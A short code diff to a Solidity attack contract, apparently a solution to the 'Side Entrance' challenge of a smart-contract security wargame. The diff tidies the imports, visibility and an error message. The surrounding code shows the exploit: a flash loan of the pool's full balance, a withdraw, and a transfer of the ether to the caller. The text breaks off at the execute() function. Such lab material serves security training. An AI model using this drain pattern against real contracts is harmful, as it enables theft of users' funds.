@@ -1,10 +1,10 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.26;
 
-import "../../04_side-entrance/SideEntranceLenderPool.sol";
+import { SideEntranceLenderPool, IFlashLoanEtherReceiver } from "../../04_side-entrance/SideEntranceLenderPool.sol";
 
 contract AttackSideEntrance is IFlashLoanEtherReceiver {
-    SideEntranceLenderPool pool;
+    SideEntranceLenderPool public pool;
 
     receive() external payable { }
 
@@ -14,7 +14,7 @@ contract AttackSideEntrance is IFlashLoanEtherReceiver {
         pool.flashLoan(address(pool).balance);
         pool.withdraw();
         (bool success,) = payable(msg.sender).call{ value: address(this).balance }("");
-        require(success);
+        require(success, "failed transfer");
     }
 
     function execute() external payable {
